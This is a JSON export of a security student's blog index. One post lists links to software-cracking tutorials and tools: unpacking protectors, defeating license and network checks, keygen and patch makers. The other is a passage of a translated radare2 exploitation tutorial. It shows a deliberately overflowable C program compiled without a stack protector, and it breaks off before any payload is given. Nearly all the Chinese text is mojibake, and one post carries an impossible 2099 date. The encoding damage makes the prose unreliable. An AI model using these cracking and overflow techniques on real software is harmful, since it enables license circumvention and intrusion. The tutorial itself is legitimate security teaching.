{"meta":{"title":"AssassinQ","subtitle":null,"description":"ZJGSU-IS-17","author":null,"url":"https://qianfei11.github.io"},"pages":[{"title":"tags","date":"2018-04-19T06:24:45.000Z","updated":"2018-04-19T06:49:25.974Z","comments":true,"path":"tags/index.html","permalink":"https://qianfei11.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2018-04-19T06:24:25.000Z","updated":"2019-02-18T04:18:42.849Z","comments":true,"path":"about/index.html","permalink":"https://qianfei11.github.io/about/index.html","excerpt":"","text":"ä¸€åä¼ªè£…æˆäºŒè¿›åˆ¶é€‰æ‰‹çš„ç­¾åˆ°é¢˜èœé¸¡ã€‚ è‹¥æœ‰ä¾µæƒï¼Œè¯·è”ç³»é‚®ç®±assassinqkeepshumble@gmail.comã€‚"}],"posts":[{"title":"é—­å…³å­¦ä¹ ","slug":"é—­å…³å­¦ä¹ ","date":"2099-12-31T15:59:59.000Z","updated":"2019-02-27T09:16:00.743Z","comments":true,"path":"2099/12/31/é—­å…³å­¦ä¹ /","link":"","permalink":"https://qianfei11.github.io/2099/12/31/é—­å…³å­¦ä¹ /","excerpt":"(Â´ï½¥_ï½¥`)","text":"(Â´ï½¥_ï½¥`) å¾çˆ±ç ´è§£è®ºå›æ•™ç¨‹ã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬ä¸€è¯¾ï¼šç ´è§£åŸºç¡€çŸ¥è¯†ä¹‹ä»‹ç»å¸¸è§å·¥å…·å’Œå£³çš„ç‰¹å¾ã€‹ è®²å¸ˆï¼šHmilyï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-378612-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬äºŒè¯¾ï¼šå®æˆ˜å»å¹¿å‘Šã€å¼¹çª—åŠä¸»é¡µé”å®šã€‹ è®²å¸ˆï¼šKidoï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-384195-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬ä¸‰è¯¾ï¼šæ”¹å¤´æ¢é¢ä¹‹ä¿®æ”¹ç‰ˆæƒå’Œèµ„æºã€‹ è®²å¸ˆï¼šKidoï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-389996-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬å››è¯¾ï¼šå‡»ç ´ç¨‹åºæœ€åšå›ºçš„å ¡å’â€“å®æˆ˜å»ç¨‹åºè‡ªæ ¡éªŒã€‹ è®²å¸ˆï¼šå°ç”Ÿæˆ‘æ€•æ€•ï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-392395-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬äº”è¯¾ï¼šåå‡»ä½œè€…çš„æŒ‘è¡…â€“å®æˆ˜è§£é™¤ç¨‹åºé‡å¯éªŒè¯ã€‹ è®²å¸ˆï¼šæˆ‘æ˜¯ç”¨æˆ·ï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-396068-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬å…­è¯¾ï¼šæ½œä¼åœ¨ç¨‹åºèº«è¾¹çš„é»‘å½±â€“å®æˆ˜ç»™ç¨‹åºè¡¥ä¸ã€‹ è®²å¸ˆï¼šæˆ‘æ˜¯ç”¨æˆ·ï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-405758-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬ä¸ƒè¯¾ï¼šæ‰‹æŠŠæ‰‹æ•™ä½ ä»å®ä¾‹çœ‹å¦‚ä½•æ”»ç ´å¸¸è§çš„ç½‘ç»œéªŒè¯ã€‹ è®²å¸ˆï¼šçˆè“å¤œé›¨ï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-408475-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬å…«è¯¾ï¼šçŸ­å…µç›¸æ¥â€“æ·±å…¥æµ…å‡ºæ¢è®¨è„±å£³ç»†èŠ‚ï¼ˆä¸Šï¼‰ã€‹ è®²å¸ˆï¼šL4Nceï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-411104-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬ä¹è¯¾ï¼šçŸ­å…µç›¸æ¥â€“æ·±å…¥æµ…å‡ºæ¢è®¨è„±å£³ç»†èŠ‚ï¼ˆä¸‹ï¼‰ã€‹ è®²å¸ˆï¼šL4Nceï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-411104-1-1.htmlã€Šå¾çˆ±ç ´è§£åŸ¹è®­ç¬¬åè¯¾ï¼šæ¢å¯»é€†å‘æ–°èˆªæ ‡â€”x64å¹³å°è„±å£³ä¸ç ´è§£å®æˆ˜ã€‹ è®²å¸ˆï¼šKidoï¼Œé“¾æ¥ï¼šhttp://www.52pojie.cn/thread-422192-1-1.html å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œä¸‹é¢æ˜¯ç ´è§£éœ€è¦ç”¨åˆ°çš„å·¥å…·OllyDbg(OD)ï¼šhttp://www.52pojie.cn/thread-350397-1-1.htmlPEIDï¼šhttp://www.52pojie.cn/thread-170387-1-1.htmlExeinfo PEï¼šhttp://www.52pojie.cn/thread-169779-1-1.htmlæ¨±èŠ±è¡¥ä¸åˆ¶ä½œå·¥å…·ï¼šhttp://www.52pojie.cn/thread-62307-1-1.htmlå†…å­˜è¡¥ä¸ç”Ÿæˆå™¨ï¼šhttp://www.52pojie.cn/thread-162411-1-1.htmlæ³¨å†Œæœºç”Ÿæˆå™¨ï¼šhttp://www.52pojie.cn/thread-159470-1-1.htmlIDA Pro v6.5ï¼šhttp://www.52pojie.cn/thread-284145-1-1.htmlç ´è§£å·¥å…·åŒ…ï¼šhttp://www.52pojie.cn/thread-190698-1-1.htmlå¾çˆ±äº‘ç›˜ã€æœ€ç‰›é€¼çš„åœ¨çº¿å·¥å…·åŒ…ã€‘ï¼šhttp://down.52pojie.cn/Tools/ NO.1Hmily ã€åˆå­¦è€…æ•™ç¨‹ã€‘ç ´è§£åŸºç¡€çŸ¥è¯†ä¹‹è®¤è¯†å£³ä¸ç¨‹åºçš„ç‰¹å¾ã€‚æ–°æ‰‹ä¸€çœ‹æ•™ç¨‹å°±åœ¨è¯´ç¨‹åºç ´è§£åº”è¯¥å…ˆè„±å£³ï¼Œé‚£åˆ°åº•ç¨‹åºæœ‰æ²¡æœ‰åŠ å£³ï¼ŸåŠ äº†ä»€ä¹ˆå£³ï¼Ÿçœ‹çœ‹å¤§Hçš„æ–‡ç« ä½ å°±æ‡‚äº†ï¼http://www.52pojie.cn/thread-234739-1-1.html NO.2ximo è„±å£³æ•™ç¨‹(24é›†å…¨)http://pan.baidu.com/s/1cebVOU å¯†ç : fxiahttp://down.52pojie.cn/å¾çˆ±ç ´è§£è§†é¢‘æ•™ç¨‹/ximoè„±å£³åŸºç¡€.7zæ¥è‡ªå¾çˆ±ç ´è§£è®ºå›LCGç»„ç»‡æˆå‘˜ä¹Ÿæ˜¯VMPè„±å£³æ’ä»¶ä½œè€…ximoåšçš„è„±å£³æ•™ç¨‹ï¼Œå ªç§°ç»å…¸ï¼Œå…¥é—¨è„±å£³å¿…å­¦ï¼å‹ç¼©åŒ…ä¸º7Zæ ¼å¼ï¼Œ7Zå®˜æ–¹ç½‘ç«™ NO.3å°ç”Ÿæˆ‘æ€•æ€• è„±å£³ç»ƒä¹ ç³»åˆ—é™„å¸¦å¯¹åº”æ–‡ç« çš„åŠ¨ç”»è§†é¢‘æ•™ç¨‹ï¼Œæ–¹ä¾¿å­¦ä¹ äº¤æµè„±å£³çŸ¥è¯†ã€‚æ•™ç¨‹å¯¹åº”åŠ¨ç”»è§†é¢‘ï¼šhttp://www.52pojie.cn/thread-11642-1-1.html å¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ ä¸€â€”-å‹ç¼©å£³ç»ƒä¹ ä¹‹ä¸€:http://www.52pojie.cn/thread-10496-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äºŒâ€”-å‹ç¼©å£³ç»ƒä¹ ä¹‹äºŒ:http://www.52pojie.cn/thread-10607-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ ä¸‰â€”-å‹ç¼©å£³ç»ƒä¹ ä¹‹ä¸‰:http://www.52pojie.cn/thread-10688-1-1.htmlå¾çˆ±ç ´è§£è„±å£³ç»ƒä¹ å››â€”â€”ç®€å•åŠ å¯†å£³:http://www.52pojie.cn/thread-10850-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äº”â€”-upxå£³:http://www.52pojie.cn/thread-10990-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ å…­â€”-TElock V0.99 :http://www.52pojie.cn/thread-11112-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ ä¸ƒâ€”-ORiEN:http://www.52pojie.cn/thread-11244-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ å…«â€”-MoleBox V2.6.5:http://www.52pojie.cn/thread-11306-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ ä¹â€”-CRYPToCRACkâ€™s PE Protector:http://www.52pojie.cn/thread-11446-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åâ€”-PESpin 1.32ï¼šhttp://www.52pojie.cn/thread-11585-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åä¸€â€”-VBè‡ªæ•ˆéªŒçš„å¤„ç†:http://www.52pojie.cn/thread-11747-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åäºŒâ€”-delphiè‡ªæ•ˆéªŒçš„å¤„ç†:http://www.52pojie.cn/thread-11883-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åä¸‰â€”-GHF Protector V1.0:http://www.52pojie.cn/thread-12011-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åå››â€”-Armadillo 6.04ï¼šhttp://www.52pojie.cn/thread-12135-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åäº”â€”-ACProtectorç³»åˆ—ä¿æŠ¤ï¼šhttp://www.52pojie.cn/thread-12279-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åå…­â€”-ACProtectorç³»åˆ—ä¿æŠ¤ï¼šhttp://www.52pojie.cn/thread-12362-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åä¸ƒâ€”-PEBundle 2.0b5 - 3.0xï¼šhttp://www.52pojie.cn/thread-12498-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åå…«â€”-Armadillo 4.40ï¼šhttp://www.52pojie.cn/thread-12620-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ åä¹â€”-PUNiSHER 1.5ï¼šhttp://www.52pojie.cn/thread-12822-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äºŒåâ€”-æœªçŸ¥å£³ä¸€ï¼šhttp://www.52pojie.cn/thread-12936-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äºŒåä¸€â€”-æœªçŸ¥å£³äºŒï¼šhttp://www.52pojie.cn/thread-13494-1-1.htmlå¾çˆ±ä¸“é¢˜è„±å£³ç»ƒä¹ äºŒåäºŒâ€”-æœªçŸ¥å£³ä¸‰ï¼šhttp://www.52pojie.cn/thread-13770-1-1.html NO.4æˆ‘æ˜¯ç”¨æˆ· ç ´è§£å®æˆ˜(10é›†å…¨)ç ´è§£å®æˆ˜æ¼”ç»ƒæ•™ç¨‹ç¬¬ä¸€æˆ˜:http://www.52pojie.cn/thread-197281-1-1.htmlç¬¬äºŒæˆ˜:http://www.52pojie.cn/thread-197598-1-1.htmlç¬¬ä¸‰æˆ˜:http://www.52pojie.cn/thread-197957-1-1.htmlç¬¬å››æˆ˜:http://www.52pojie.cn/thread-198203-1-1.htmlç¬¬äº”æˆ˜:http://www.52pojie.cn/thread-198365-1-1.htmlç¬¬å…­æˆ˜:http://www.52pojie.cn/thread-198930-1-1.htmlç¬¬ä¸ƒæˆ˜:http://www.52pojie.cn/thread-199459-1-1.htmlç¬¬å…«æˆ˜:http://www.52pojie.cn/thread-199834-1-1.htmlç¬¬ä¹æˆ˜:http://www.52pojie.cn/thread-200655-1-1.htmlç¬¬åæˆ˜:http://www.52pojie.cn/thread-200798-1-1.html NO.5Blue .NETç³»åˆ—æ•™ç¨‹(4é›†å…¨)å›¾æ–‡æ•™ç¨‹åˆ†æ.netç¨‹åºï¼ç¬¬ä¸€è¯¾ http://www.52pojie.cn/thread-248348-1-1.htmlç¬¬äºŒè¯¾ http://www.52pojie.cn/thread-249034-1-1.htmlç¬¬ä¸‰è¯¾ http://www.52pojie.cn/thread-250626-1-1.htmlç¬¬å››è¯¾ http://www.52pojie.cn/thread-250633-1-1.html NO.6å»è½¯ä»¶å¼¹çª—ç³»åˆ—æ•™ç¨‹(å…±ä¸¤é›†)ç¬¬ä¸€è¯¾ http://www.52pojie.cn/thread-316180-1-1.htmlç¬¬äºŒè¯¾ http://www.52pojie.cn/thread-323346-1-1.html NO.7R4ndomç ´è§£æ•™ç¨‹å…¨æ–‡ç¿»è¯‘(å…±ä¸ƒé›†)ç¬¬ä¸€è¯¾ http://www.52pojie.cn/thread-344925-1-1.htmlç¬¬äºŒè¯¾ http://www.52pojie.cn/thread-345839-1-1.htmlç¬¬ä¸‰è¯¾ http://www.52pojie.cn/thread-346455-1-1.htmlç¬¬å››è¯¾ http://www.52pojie.cn/thread-350727-1-1.htmlç¬¬äº”è¯¾ http://www.52pojie.cn/thread-352818-1-1.htmlç¬¬å…­è¯¾ http://www.52pojie.cn/thread-354029-1-1.htmlç¬¬ä¸ƒè¯¾ http://www.52pojie.cn/thread-355207-1-1.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"Radare2ä¹‹æ—…-Part2ï¼šExploitation","slug":"Radare2ä¹‹æ—…-Part2ï¼šExploitation","date":"2019-02-23T03:18:10.000Z","updated":"2019-02-24T13:38:55.723Z","comments":true,"path":"2019/02/23/Radare2ä¹‹æ—…-Part2ï¼šExploitation/","link":"","permalink":"https://qianfei11.github.io/2019/02/23/Radare2ä¹‹æ—…-Part2ï¼šExploitation/","excerpt":"ç¿»è¯‘è‡ªMegabeetsã€‚","text":"ç¿»è¯‘è‡ªMegabeetsã€‚ åºè¨€æ¬¢è¿æ¥åˆ°æˆ‘ä»¬radare2ä¹‹æ—…çš„ç¬¬äºŒéƒ¨åˆ†ï¼åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¼šæ¶µç›–radare2çš„æ›´å¤šéƒ¨åˆ†ï¼ŒåŒæ—¶è¿™æ¬¡æ›´æ³¨é‡äºäºŒè¿›åˆ¶æ¼æ´æŒ–æ˜ã€‚ ç›¸ä¿¡å¤§å®¶éƒ½ä¸€å®šå¾ˆæœŸå¾…è¿™ç¬¬äºŒéƒ¨åˆ†ï¼Œä¹‹åçš„å†…å®¹ä¹Ÿä¸€å®šä¼šæ›´å¿«åœ°åˆ†äº«ç»™å¤§å®¶ã€‚å¦‚æœä½ è¿˜æ²¡æœ‰é˜…è¯»è¿‡è¿™ä¸€ç³»åˆ—çš„ç¬¬ä¸€éƒ¨åˆ†ï¼Œæˆ‘éå¸¸æ¨èä½ å»è¯»ä¸€è¯»ã€‚ç¬¬ä¸€éƒ¨åˆ†è®°å½•äº†radare2çš„åŸºç¡€å†…å®¹ï¼ŒåŒæ—¶ä¹Ÿè§£é‡Šäº†å¾ˆå¤šæˆ‘ä»Šå¤©ä¼šç”¨åˆ°çš„å‘½ä»¤ã€‚ åœ¨è¿™ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯å¯¹ä¸€ä¸ªç®€å•çš„ç¨‹åºè¿›è¡Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ã€‚radare2æœ‰å¾ˆå¤šä¸åŒçš„åŠŸèƒ½å¯ä»¥å¸®æˆ‘ä»¬å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œä¾‹å¦‚ä¿æŠ¤æŠ€æœ¯ã€æŸ¥æ‰¾ROPã€ç”Ÿæˆéšæœºåºåˆ—ã€æŸ¥çœ‹å¯„å­˜å™¨å†…å®¹ç­‰ç­‰ã€‚ä½ å¯ä»¥åœ¨æœ¬æ–‡æœ«å°¾æ‰¾åˆ°ä¸€ä»½å‘½ä»¤å¯¹åº”è¡¨ã€‚ä»Šå¤©æˆ‘ä¼šå‘ä½ ä»¬å±•ç¤ºè¿™äº›å¼ºå¤§çš„åŠŸèƒ½ï¼ŒåŒæ—¶æˆ‘ä»¬ç”¨radare2æ¥ç»•è¿‡åœ¨å¼€å¯ASLRçš„ç³»ç»Ÿä¸Šè¿è¡Œå¹¶ä¸”æœ‰NXä¿æŠ¤çš„ç¨‹åºã€‚æˆ‘å‡è®¾å¤§å®¶éƒ½å·²ç»æŒæ¡äº†ä»¥ä¸‹çš„é¢„å¤‡çŸ¥è¯†ï¼š æ±‡ç¼–è¯­è¨€ ç¨‹åºä¿æŠ¤æŠ€æœ¯ï¼ˆNXã€ASLRï¼‰ æ ˆå¸§ç»“æ„ ç¼“å†²åŒºæº¢å‡º é¢å‘è¿”å›ç¼–ç¨‹ x86è°ƒç”¨çº¦å®š ç†Ÿæ‚‰è¿™äº›çŸ¥è¯†æ˜¯å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œå› ä¸ºæ–‡ç« ä¸­æˆ‘å¹¶ä¸ä¼šç»†è®²ï¼Œç”šè‡³ä¸ä¼šå¯¹å…¶è§£é‡Šã€‚ æ›´æ–°radare2é¦–å…ˆï¼Œæˆ‘ä»¬å°†radare2æ›´æ–°è‡³å…¶gitçš„æœ€æ–°ç‰ˆç‰ˆï¼š 123$ git clone https://github.com/radare/radare2.git # å¦‚æœä½ è¿˜æ²¡æœ‰å…‹éš†ä¸‹æ¥çš„è¯$ cd radare2$ ./sys/install.sh ç­‰å¾…æ›´æ–°å®Œæˆéœ€è¦å¾ˆé•¿ä¸€æ®µæ—¶é—´ï¼Œåœ¨è¿™æœŸé—´ä¸å¦‚çœ‹äº›è§†é¢‘æ”¾æ¾ä¸€ä¼šå„¿ã€‚ ç†Ÿæ‚‰ç¨‹åºä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½ç¨‹åºï¼Œåœ¨è¿™é‡Œä¸‹è½½æºç ã€‚å¦‚æœä½ æƒ³è‡ªå·±ç¼–è¯‘ç¨‹åºï¼Œç”¨ä»¥ä¸‹å‘½ä»¤ï¼š 1$ gcc -m32 -fno-stack-protector megabeets_0x2.c -o megabeets_0x2 è¿™æ¬¡çš„ç¨‹åºä¸ä¸Šä¸€æ¬¡çš„ç¨‹åºéå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯åœ¨main()å‡½æ•°ä¸­æœ‰ä¸€äº›ç»†å¾®çš„æ”¹å˜ï¼š ç¼–è¯‘æ—¶ä¸ä½¿ç”¨å‚æ•°-z execstacæ¥å¼€å¯NX é€šè¿‡scanfæ¥æ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œè€Œä¸æ˜¯é€šè¿‡ç¨‹åºçš„å‚æ•° å¤§éƒ¨åˆ†è¾“å‡ºçš„å‡½æ•°ä¸ºputs å¯¹ç¨‹åºçš„è¾“å‡ºåšäº†ä¸€ç‚¹ä¿®æ”¹ è¿™æ˜¯ä¹‹å‰çš„main()å‡½æ•°ï¼š 12345678910111213int main(int argc, char *argv[])&#123; printf(\"\\n .:: Megabeets ::.\\n\"); printf(\"Think you can make it?\\n\"); if (argc &gt;= 2 &amp;&amp; beet(argv[1])) &#123; printf(\"Success!\\n\\n\"); &#125; else printf(\"Nop, Wrong argument.\\n\\n\"); return 0;&#125; ç„¶åç°åœ¨çš„mainå‡½æ•°æ˜¯è¿™æ ·çš„ï¼š 12345678910111213141516int main(int argc, char *argv[])&#123; char *input; puts(\"\\n .:: Megabeets ::.\\n\"); puts(\"Show me what you got:\"); scanf(\"%ms\", &amp;input); if (beet(input)) &#123; printf(\"Success!\\n\\n\"); &#125; else puts(\"Nop, Wrong argument.\\n\\n\"); return 0;&#125; ç¨‹åºçš„åŠŸèƒ½ååˆ†ç®€å•ï¼Œå¹¶ä¸”åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å·²ç»å¯¹å®ƒå¾ˆç†Ÿæ‚‰äº†â€”â€”è¦æ±‚è¾“å…¥å­—ç¬¦ä¸²ï¼Œä¸ç»è¿‡rot13åŠ å¯†çš„å­—ç¬¦ä¸²Megabeetsæ¯”è¾ƒã€‚æ•…è¾“å…¥åº”è¯¥ä¸ºZrtnorrgfã€‚ 123456789101112131415$ ./megabeets_0x2 .:: Megabeets ::.Show me what you got:blablablablaNop, Wrong argument.$ ./megabeets_0x2 .:: Megabeets ::.Show me what you got:ZrtnorrgfSuccess! è¿™äº›éƒ½å¾ˆç®€å•ï¼Œä½†æ˜¯æˆ‘ä»¬ä»Šå¤©çš„é‡ç‚¹å¹¶ä¸æ˜¯ç ´è§£ä¸€ä¸ªç®€å•çš„crackmeï¼Œè€Œæ˜¯å¯¹å…¶è¿›è¡Œæ¼æ´åˆ©ç”¨ã€‚é‚£æˆ‘ä»¬å¼€å§‹å§ï¼ ç†è§£æ¼æ´å¯¹äºæ¯ä¸€ä¸ªPWNé¢˜ç»™å‡ºçš„ç¨‹åºæ¥è¯´ï¼Œæ£€æŸ¥ç¨‹åºå¼€äº†ä»€ä¹ˆä¿æŠ¤æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æåˆ°çš„rabin2ï¼Œæˆ–è€…ç›´æ¥åœ¨radare2çš„shellé‡Œæ‰§è¡Œiå‘½ä»¤ã€‚å› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰ç”¨radare2æ‰“å¼€æ–‡ä»¶ï¼Œå°±å…ˆç”¨rabin2æ¥çœ‹çœ‹ï¼š 1234567891011121314151617181920212223242526272829$ rabin2 -I megabeets_0x2 arch x86binsz 6072bintype elfbits 32canary falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true åœ¨æ ‡è®°çš„å‡ è¡Œä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºå¼€äº†NXï¼Œä¹Ÿå°±æ˜¯è¯´æ ˆæ˜¯ä¸å¯æ‰§è¡Œçš„ã€‚è¿˜æœ‰ï¼Œè¯¥ç¨‹åºæ²¡æœ‰å¼€å¯Canaryã€PICæˆ–æ˜¯RELROã€‚ ç°åœ¨æˆ‘ä»¬è¿…é€Ÿåœ°è¿‡ä¸€éç¨‹åºçš„æ‰§è¡Œæµï¼Œè¿™æ¬¡æˆ‘ä»¬çœ‹ä¸€çœ‹å®ƒçš„åæ±‡ç¼–ä»£ç ï¼ˆå¹¶ä¸æ˜¯æ¯æ¬¡æ¼æ´æŒ–æ˜éƒ½èƒ½æœ‰æºç ï¼‰ã€‚ä½¿ç”¨radare2çš„è°ƒè¯•æ¨¡å¼æ‰“å¼€ç¨‹åºï¼š 12345678$ r2 -d megabeets_0x2Process with PID 20859 startedâ€¦= attach 20859 20859bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32â€“ Your endian swaps[0xf7782b30]&gt; aas -d â€“ ç”¨è°ƒè¯•æ¨¡å¼æ‰“å¼€ aas â€“ åˆ†æå‡½æ•°ã€ç¬¦å·ä»¥åŠå…¶ä»– æ³¨æ„ï¼šæ­£å¦‚æˆ‘åœ¨å‰ä¸€ç¯‡æ–‡ç« æ‰€æåˆ°çš„ï¼Œå¼€å§‹æ—¶ä½¿ç”¨aaaåˆ†ææ˜¯æœ€æ¨èçš„æ–¹å¼ï¼Œå› ä¸ºåˆ†ææœ¬æ¥å°±æ˜¯ä¸€ä¸ªå¾ˆå¤æ‚çš„è¿‡ç¨‹ã€‚æˆ‘åœ¨è¿™ç¯‡å›ç­”é‡Œå†™äº†æ›´å¤šâ€”â€”è¯»ä¸€ä¸‹ä¹Ÿè®¸ä¼šè®©ä½ çš„ç†è§£æ›´æ·±ã€‚ ç°åœ¨æˆ‘ä»¬ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œç›´åˆ°mainå‡½æ•°ã€‚åªè¦è¾“å…¥å‘½ä»¤dcu mainï¼š 12345678[0xf7797b30]&gt; dcu?|Usage: dcu Continue until address| dcu address Continue until address| dcu [..tail] Continue until the range| dcu [from] [to] Continue until the range[0xf7797b30]&gt; dcu mainContinue until 0x08048658 using 1 bpsizehit breakpoint at: 8048658 dcuä»£è¡¨debug continue until ç°åœ¨è®©æˆ‘ä»¬è¾“å…¥VVè¿›å…¥å›¾å½¢æ¨¡å¼ã€‚åœ¨ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šè¿‡ï¼Œä½ å¯ä»¥é€šè¿‡på’ŒPåˆ‡æ¢è§†è§’ï¼Œé€šè¿‡k/j/h/låˆ†åˆ«å‘ä¸Š/ä¸‹/å·¦/å³ç§»åŠ¨ï¼Œé€šè¿‡gå’Œè°ƒç”¨æ—çš„å­—æ¯è·³è½¬å‡½æ•°ï¼ˆä¾‹å¦‚gdï¼‰ã€‚ ç”¨?æ¥åˆ—å‡ºæ‰€æœ‰åœ¨å›¾å½¢æ¨¡å¼ä¸‹çš„å‘½ä»¤ï¼ŒåŒæ—¶åˆ«å¿˜è®°Rå‘½ä»¤ğŸ˜‰ main()å‡½æ•°æ˜¯ç¨‹åºè¦æ±‚æˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹ï¼Œå¹¶ä¸”å®ƒå°†è¾“å…¥ä¼ ç»™sym.beetã€‚é€šè¿‡gcæˆ‘ä»¬è·³è½¬åˆ°å¤„ç†æˆ‘ä»¬è¾“å…¥çš„beet()å‡½æ•°ï¼š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”¨æˆ·çš„è¾“å…¥[arg_8h]è¢«å¤åˆ¶ç»™ä¸€ä¸ªç¼“å†²åŒºï¼ˆ[local_88h]ï¼‰ï¼Œç„¶åå°±æ˜¯æˆ‘ä»¬åœ¨å‰ä¸€ç¯‡æ–‡ç« ä¸­æ‰€çœ‹åˆ°è¿‡çš„ï¼Œå­—ç¬¦ä¸²Megabeetsç”¨rot13åŠ å¯†äº†ï¼Œæ‰€å¾—ç»“æœä¸æˆ‘ä»¬çš„è¾“å…¥åšæ¯”è¾ƒã€‚æˆ‘ä»¬ä¹‹å‰äº†è§£è¿‡ï¼Œæˆ‘è¿™é‡Œå°±ä¸åšæ·±ç©¶ã€‚ ä½ æœ‰çœ‹åˆ°ä»€ä¹ˆå¯ä»¥çš„åœ°æ–¹å—ï¼Ÿæˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å¯¹é•¿åº¦åšæ£€æŸ¥ï¼Œç„¶åç›´æ¥å¤åˆ¶åˆ°äº†ç¼“å†²åŒºä¸­ã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€ä¸²è¶…è¿‡ç¼“å†²åŒºå¤§å°çš„å­—ç¬¦ä¸²ï¼Œå°±èƒ½å¯¼è‡´æ ˆä¸Šçš„ç¼“å†²åŒºæº¢å‡ºã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†æ¼æ´ã€‚ è§„åˆ’æ¼æ´åˆ©ç”¨è„šæœ¬æ—¢ç„¶æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†æœ‰æ¼æ´çš„å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªpayloadæ¥åˆ©ç”¨å®ƒã€‚æˆ‘ä»¬çš„ç›®æ ‡å¾ˆæ˜äº†ï¼Œå°±æ˜¯åœ¨ç³»ç»Ÿä¸ŠæˆåŠŸå¼€ä¸€ä¸ªshellã€‚é¦–å…ˆï¼Œæˆ‘ä»¬è¦ç¡®è®¤ç¡®å®æœ‰ä¸€ä¸ªæœ‰æ¼æ´çš„å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæˆ‘ä»¬çš„payloadå¯ä»¥è¦†ç›–æ ˆçš„åç§»ã€‚ æˆ‘ä»¬å°†ä¼šä½¿ç”¨ä¸€ä¸ªradare2æ¡†æ¶ä¸­çš„å·¥å…·ï¼Œå«åšragg2ã€‚å®ƒèƒ½å¤Ÿä¸ºæˆ‘ä»¬ç”Ÿæˆä¸€æ®µå¾ªç¯çš„å¾·å¸ƒé²å› åºåˆ—ï¼Œç”¨æ¥æ£€æµ‹è¦†ç›–ç¼“å†²åŒºçš„ç¡®åˆ‡çš„åç§»å¤§å°ã€‚ 123456789$ ragg2 -&lt;truncated&gt; -P [size] prepend debruijn 